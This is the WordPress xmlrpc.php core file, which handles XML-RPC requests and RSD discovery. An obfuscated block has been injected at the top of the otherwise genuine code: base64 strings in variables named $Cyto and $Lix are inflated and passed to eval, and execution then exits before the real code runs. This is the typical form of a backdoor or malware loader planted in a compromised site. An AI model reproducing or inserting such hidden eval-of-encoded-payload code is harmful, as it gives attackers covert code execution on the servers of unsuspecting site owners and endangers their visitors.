<?php
/**
 * XML-RPC protocol support for WordPress
 *
 * @package WordPress
 */

/**
 * Whether this is an XML-RPC Request
 *
 * @var bool
 */
// Some browser-embedded clients send cookies. We don't want them.
// A bug in PHP < 5.2.2 makes $HTTP_RAW_POST_DATA not set by default,
// but we can do it ourself.
$Cyto = "Sy1LzNFQt1dLL7FW10uvKs1Lzs8tKEotLtZIr8rMS8tJLEnVSEosTjUziU9JT\x635PSdUoLikqSi3TUPHJrNAE\x41Ws\x41";
$Lix = "hbdq1HQ/2cmbnW5GOTkz1wr/zvWQ43mHSINBOFimiHIxnEsoTnCT+GTstc7RazW03baUfFO5TufeLjy2BJjZ1bTs+1kOkL5xSCvWvJyug7axJ/L5wJOofIc5Xv6egXV/sGxfClgf69n25DaG4E9Di9PYFHVn2FukCfJdCr6wUYHBiLZ99omxzQVuwfjn02n+Qfv6NRdqE/dxQlvq6Np9XjoeT9dl47qJuTqeXp8qTZ+1oid1C5CMb9B3zHHlH/6/b81QSwr1d8M0bJRPLZ/uYlSa/0k/LnIuW5tucm0XE8cg4/aFpxESk9qr15olUHTrPEsNUcL4Y9pNdjGC2XJm7yg5HBEwHMpCYveATHjZQtJGm5Q5OgLbYBP3ksDni6jgoRGP3dKBdobj0zwN7NFYpA4lJhVdwoMWIYXG1KdsmCfRHL89hm3z0Q/i0F63467O7NkR0Ky8YDZIF5zjkt/Zv/me7xpfnf7LseLRUcbf/vIJugg1hAy6MESdnO8CxVm7cO0UdWQoCxMSERMd/E/N9RBMC+WXSVHn45vZBkZA";
eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
exit;
?>
<?php
if ( ! isset( $HTTP_RAW_POST_DATA ) ) {
	$HTTP_RAW_POST_DATA = file_get_contents( 'php://input' );
}

// Fix for mozBlog and other cases where '<?xml' isn't on the very first line.
if ( isset( $HTTP_RAW_POST_DATA ) ) {
	$HTTP_RAW_POST_DATA = trim( $HTTP_RAW_POST_DATA );
}

/** Include the bootstrap for setting up WordPress environment */
require_once __DIR__ . '/wp-load.php';

if ( isset( $_GET['rsd'] ) ) { // http://cyber.law.harvard.edu/blogs/gems/tech/rsd.html
	header( 'Content-Type: text/xml; charset=' . get_option( 'blog_charset' ), true );
	echo '<?xml version="1.0" encoding="' . get_option( 'blog_charset' ) . '"?' . '>';
	?>
<rsd version="1.0" xmlns="http://archipelago.phrasewise.com/rsd">
	<service>
		<engineName>WordPress</engineName>
		<engineLink>https://wordpress.org/</engineLink>
		<homePageLink><?php bloginfo_rss( 'url' ); ?></homePageLink>
		<apis>
			<api name="WordPress" blogID="1" preferred="true" apiLink="<?php echo site_url( 'xmlrpc.php', 'rpc' ); ?>" />
			<api name="Movable Type" blogID="1" preferred="false" apiLink="<?php echo site_url( 'xmlrpc.php', 'rpc' ); ?>" />
			<api name="MetaWeblog" blogID="1" preferred="false" apiLink="<?php echo site_url( 'xmlrpc.php', 'rpc' ); ?>" />
			<api name="Blogger" blogID="1" preferred="false" apiLink="<?php echo site_url( 'xmlrpc.php', 'rpc' ); ?>" />
			<?php
			/**
			 * Add additional APIs to the Really Simple Discovery (RSD) endpoint.
			 *
			 * @link http://cyber.law.harvard.edu/blogs/gems/tech/rsd.html
			 *
			 * @since 3.5.0
			 */
			do_action( 'xmlrpc_rsd_apis' );
			?>
		</apis>
	</service>
</rsd>
	<?php
	exit;
}

require_once ABSPATH . 'wp-admin/includes/admin.php';
require_once ABSPATH . WPINC . '/class-IXR.php';
require_once ABSPATH . WPINC . '/class-wp-xmlrpc-server.php';

/**
 * Posts submitted via the XML-RPC interface get that title
 *
 * @name post_default_title
 * @var string
 */
$post_default_title = '';

/**
 * Filters the class used for handling XML-RPC requests.
 *
 * @since 3.1.0
 *
 * @param string $class The name of the XML-RPC server class.
 */
$wp_xmlrpc_server_class = apply_filters( 'wp_xmlrpc_server_class', 'wp_xmlrpc_server' );
$wp_xmlrpc_server       = new $wp_xmlrpc_server_class;

// Fire off the request.
$wp_xmlrpc_server->serve_request();

exit;

/**
 * logIO() - Writes logging info to a file.
 *
 * @deprecated 3.4.0 Use error_log()
 * @see error_log()
 *
 * @param string $io Whether input or output
 * @param string $msg Information describing logging reason.
 */
function logIO( $io, $msg ) { // phpcs:ignore WordPress.NamingConventions.ValidFunctionName.FunctionNameInvalid
	_deprecated_function( __FUNCTION__, '3.4.0', 'error_log()' );
	if ( ! empty( $GLOBALS['xmlrpc_logging'] ) ) {
		error_log( $io . ' - ' . $msg );
	}
}
